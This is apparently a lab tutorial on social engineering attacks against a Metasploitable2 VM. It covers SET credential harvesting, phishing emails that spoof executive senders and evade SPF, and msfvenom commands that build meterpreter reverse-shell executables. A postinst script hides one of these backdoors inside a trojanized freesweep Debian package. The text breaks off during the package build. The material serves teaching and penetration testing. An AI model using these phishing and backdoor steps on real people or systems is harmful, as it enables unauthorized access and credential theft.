Part 1 - Credential Harvesting via Site Cloner

A fundamental premise underlying many features of the Social Engineering Toolkit (SET), is its capacity to swiftly generate attacks tailored for testing and demonstration objectives. However, an essential inquiry pertains to the believability of these generated attacks. It is pertinent to acknowledge that while SET facilitates the rapid creation of attack scenarios, their credibility hinges on various factors.

In assessing the credibility of SET-generated attacks, one must recognize the distinction between their immediate utility for demonstration purposes and their efficacy in real-world scenarios. While SET offers convenience in rapidly crafting attack simulations, achieving a level of authenticity that mirrors genuine cyber threats demands additional considerations beyond the tool's functionalities.

Notably, the transition from a novice, or "script kiddie," level of proficiency to orchestrating attacks with a tangible likelihood of success necessitates a deeper understanding of the targeted systems, human psychology, and evolving cybersecurity defenses. SET, by design, serves as an entry point for exploring social engineering tactics; however, advancing beyond this initial stage mandates supplementary efforts.

To attain a level of proficiency wherein cyberattacks pose a genuine threat, practitioners must complement their toolkit with a broader arsenal of techniques and tools. This progression typically involves leveraging other specialized software and, in many cases, developing custom tools tailored to specific objectives and targeted environments. Such bespoke solutions afford practitioners the flexibility to adapt their methodologies to circumvent evolving defense mechanisms and enhance the sophistication of their attacks.

Consequently, while SET offers a valuable starting point for familiarizing oneself with social engineering techniques, its utility in orchestrating attacks with a substantial probability of success is contingent upon the practitioner's ability to integrate complementary tools and cultivate a nuanced understanding of cybersecurity principles. Thus, while SET expedites the creation of attack scenarios for demonstration purposes, achieving credibility in practical settings necessitates a multifaceted approach encompassing diverse tools and skill sets beyond the purview of SET alone.

Part 2 - Email Blast

To effectively entice victims to visit our cloned credential harvesting site, we must craft an email that appears both convincing and urgent, prompting recipients to take immediate action. Leveraging the Social-Engineer Toolkit's "Mass Mailer" module, or any analogous mass mailing tool, offers a means to disseminate these deceptive emails at scale. However, circumventing anti-spam technologies such as Sender Policy Framework (SPF) requires careful strategy.

Firstly, the email's sender address should mimic that of a trusted source within the target organization, such as ceo@company.com or tech-support@company.com. While this impersonation enhances the email's credibility, it also raises the likelihood of encountering SPF restrictions and other filtering mechanisms.

Part 3 - Payloads via msfvenom

Metasploit offers a powerful utility known as msfvenom, which enables the encapsulation of exploits into standalone executables. These executables can be disguised and distributed through social engineering tactics, exploiting human vulnerabilities rather than technical weaknesses. In a social engineering attack, unsuspecting users are manipulated into executing these seemingly harmless files, unwittingly triggering the embedded exploits. This capability magnifies the potential impact of cyber threats, as attackers can easily deploy malicious payloads across diverse systems, exploiting the trust and naivety of users to gain unauthorized access or execute malicious actions.

  1. On your Kali Linux VM , create a stand-alone executable payload using msvenom.

    1. View a list of all available payloads in msvenom.

      ⬤ ⬤ ⬤ CODE

        # msfvenom
        $ msfvenom

    2. This is a long list, and it's the same list of available payloads that Metasploit normally has available to run after an exploit. This time no exploit are needed, since we're using social engineering to trick the user into running the payload for us.
      To view the list of available output formats, CPU architectures, and platforms run the following commands:

      ⬤ ⬤ ⬤ CODE

        # Formats, Architectures and Platforms
        $ msfvenom --list formats
        $ msfvenom --list archs
        $ msfvenom --list platforms

    3. Make an executable that is will be runnable on our Metasploitable2 VM, Linux host. That would be the .elf file type. Windows would be .exe file type. Pick a payload from the list that works on Linux, and ask msfvenom to package it for you and save it to the /tmp directory with the filename LegitProgram, /tmp/LegitProgram. This payload is hardwired to connect back to the LHOST address, which should be the Kali Linux VM IP:

      ⬤ ⬤ ⬤ CODE

        # Creating an Executable
        $ msfvenom --arch x86 --format elf --platform linux LHOST=192.168.1.x LPORT=4575 --payload linux/x86/meterpreter_reverse_tcp > /tmp/LegitProgram

    4. Change to the /tmp directory, and start a simple webserver in Kali Linux to host this LegitProgram binary. We're using this as a way to get the binary on the target machine since we're in control of both sides, but in reality this would be accomplished through some social engineering attack.

      ⬤ ⬤ ⬤ CODE

        # Hosting the Social Engineering Exploit
        $ cd /tmp

        # Built-in Webserver in Python 2
        $ python2 -m SimpleHTTPServer 8888

        # Alternative Built-in Webserver in Python 3
        $ python3 -m http.server 8888

  1. On your Metasploitable2 VM, download the file from the Kali Linux VM webserver:

    ⬤ ⬤ ⬤ CODE

      # Download Exploit
      $ wget 192.168.1.x:8888/LegitProgram
     

    WARNING
      ●

    If you have to re-run this wget command for any reason and leave the original file in place, the next file will be named LegitProgram.1, LegitProgram.2, etc, as shown in the wget output. You can either delete the older copy before running wget again or make a note of what the most recent file name is.
     

    NOTE
      ●

    At this point, you can CTRL-C on the web server; we don't need it any more.

  1. On your Kali Linux VM, start the reverse shell for the payload you created in Step 3.1.


    1. Use the generic payload handler that provides Metasploit features to exploits run outside of the framework. Configure it for the payload you just downloaded on the target (Metasploitable2 VM), as it needs to know.

      1. What payload is incoming.

      2. What IP the payload is connecting to.

Part 4 - Payload Obfuscation

Instead of overtly coercing the user into executing a suspicious program, a more stealthy approach involves bundling the backdoor alongside a seemingly legitimate application. In this scenario, we can craft a Linux installer package, specifically a Debian package (.deb file), for the popular Minesweeper game "freesweep". By incorporating the backdoor into the bundle, unsuspecting users are lured into installing what appears to be a harmless game, unaware of the additional surprise concealed within. This tactic capitalizes on the trust users place in familiar software, exploiting their complacency to facilitate unauthorized access or malicious activities on their system. This clandestine method underscores the importance of vigilance and robust security measures to counteract deceptive tactics employed by cyber adversaries.

  1. On your Kali Linux VM, craft a payload for the freesweep application.

    1. Download the legitimate .deb file from the package manager. Since we're going to run this on the OLD Metasploitable2 VM (32-bit), let's grab the correct binary out of the Ubuntu archives. That way, the dynamic library dependencies will work out OK.

      ⬤ ⬤ ⬤ CODE

        # Download Legitimate Package
        $ mkdir -p /tmp/working
        $ cd /tmp/working
        $ wget http://old-releases.ubuntu.com/ubuntu/pool/universe/f/freesweep/freesweep_0.88-4.3_i386.deb

    2. Extract the files into that working directory.

      ⬤ ⬤ ⬤ CODE

        # Extract Package
        $ dpkg -x freesweep_0.88-4.3_i386.deb package

    3. Add a DEBIAN directory to contain the payload we are included in this package.

      ⬤ ⬤ ⬤ CODE

        # Add Surprise Directory
        $ mkdir /tmp/working/package/DEBIAN

    4. In the DEBIAN directory, create a new file called control with the following contents.

      ⬤ ⬤ ⬤ CODE

        # Create Control File
        $ nano /tmp/working/package/DEBIAN/control

      ⬤ ⬤ ⬤ CODE

        Package: freesweep
        Version: 0.88-4.3
        Section: Games and Amusement
        Priority: optional
        Architecture: i386
        Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
        Description: a text-based minesweeper
         Freesweep is an implementation of the popular minesweeper game, where
          one tries to find all the mines without igniting any, based on hints given
          by the computer. Unlike most implementations of this game, Freesweep
          works in any visual text display - in Linux console, in an xterm, and in
         most text-based terminals currently in use.

    5. In the DEBIAN directory, create a post-installation script called postinst with the following commands that.

      1. Change the permissions of the innocently-named "freesweep_scores" to include the execute flag.

      2. Run the innocently named "freesweep_scores."

      3. Run the legitimate freesweep program.

      ⬤ ⬤ ⬤ CODE

        #!/bin/sh
        sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /usr/games/freesweep

    6. Make this script executable.

      ⬤ ⬤ ⬤ CODE

        # Make Script Executable
        $ chmod +x /tmp/working/package/DEBIAN/postinst

    7. Now, generate our backdoor program freesweep_scores.

      ⬤ ⬤ ⬤ CODE

        # Generate Backdoor
        $ msfvenom --payload linux/x86/meterpreter_reverse_tcp --arch x86 --format elf --platform linux LHOST=192.168.1.x LPORT=4575 --out /tmp/working/package/usr/games/freesweep_scores

    8. Build the new .deb file with the backdoor program.

      ⬤ ⬤ ⬤ CODE
